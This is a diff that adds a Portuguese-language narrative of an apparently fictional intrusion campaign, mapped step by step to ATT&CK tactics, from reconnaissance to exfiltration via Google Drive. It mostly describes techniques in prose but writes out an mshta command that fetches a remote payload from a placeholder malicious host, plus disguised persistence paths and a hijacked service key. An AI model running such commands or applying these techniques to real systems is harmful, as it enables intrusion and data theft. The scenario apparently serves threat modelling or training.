@@ -1,0 +1,19 @@
+O operador iniciou sua campanha realizando reconhecimento técnico (Tática: Reconnaissance), focando em domínios internos e subdomínios de uma empresa de tecnologia com ambientes híbridos. Através de ferramentas como Amass e recon-ng, o atacante mapeou endpoints e APIs corporativas pouco documentadas, incluindo instâncias de Jenkins expostas e aplicações legadas com autenticação obsoleta.
+
+Em paralelo, utilizou a técnica Develop Capabilities (Tática: Resource Development) para criar um implante modular em Go que funcionava tanto em ambientes Windows quanto Linux, com capacidade de evasão automática por assinatura e ofuscação nativa. O binário foi assinado com um certificado digital de uma empresa fictícia previamente registrada e já listada como “confiável” em repositórios de software open-source.
+
+Para acesso inicial, a equipe de ataque explorou Spearphishing via Service (Tática: Initial Access). Utilizaram o Slack de uma empresa parceira comprometida para enviar mensagens convincentes a engenheiros da organização-alvo, com links apontando para documentos maliciosos hospedados em uma instância Google Drive pública. O documento explorava macros maliciosas em Visual Basic, que carregavam um script remoto com MSHTA ao ser aberto.
+
+Após a vítima interagir com o documento, foi executada a técnica Mshta (Tática: Execution), com a chamada mshta.exe http://malicioso[.]site/payload.hta. Esse payload instalava o binário implantado, ativando o canal de comando e controle.
+
+Para garantir persistência em máquinas macOS do ambiente de desenvolvedores, foi utilizada a técnica Plist Modification (Tática: Persistence), criando entradas de inicialização em ~/Library/LaunchAgents/com.apple.updates.plist, que referenciavam o backdoor sob o disfarce de ferramenta de atualização.
+
+Já em máquinas Windows, o binário foi implantado com o parâmetro --hidden e persistência foi garantida via schtasks /create, mas o foco maior foi escalar privilégios com Service Registry Permissions Weakness (Tática: Privilege Escalation). Através de uma chave de serviço mal configurada em HKLM\SYSTEM\CurrentControlSet\Services\BackupService, o atacante substituiu o binário apontado por um loader malicioso com privilégios SYSTEM.
+
+Para manter um perfil furtivo, o implante aplicava Process Hollowing (Tática: Defense Evasion), injetando o payload no processo legítimo svchost.exe logo após o boot, mascarando a execução real e evitando detecção por antivírus comportamental.
+
+Durante a movimentação lateral, foi explorada uma aplicação desatualizada com suporte DCOM habilitado, ativando Component Object Model and Distributed COM (Tática: Lateral Movement). O atacante lançou código remoto em máquinas Windows da rede, utilizando credenciais reutilizadas encontradas em arquivos de configuração.
+
+Após escalar lateralmente e alcançar um host com acesso administrativo à conta AWS da empresa, foram realizados comandos via aws-cli para listar buckets e armazenar artefatos sensíveis. O atacante ativou então um canal de Command and Control via Web Service (Tática: Command and Control), utilizando HTTPS via AWS API Gateway, com headers ofuscados como se fossem chamadas legítimas de telemetry.
+
+Por fim, os dados coletados — credenciais, registros de banco de dados e arquivos sensíveis — foram compactados e enviados por meio da técnica Exfiltration Over Web Service (Tática: Exfiltration), simulando uploads autenticados ao Google Drive, onde o atacante mantinha controle de pastas públicas com acesso controlado via tokens OAuth vencidos.
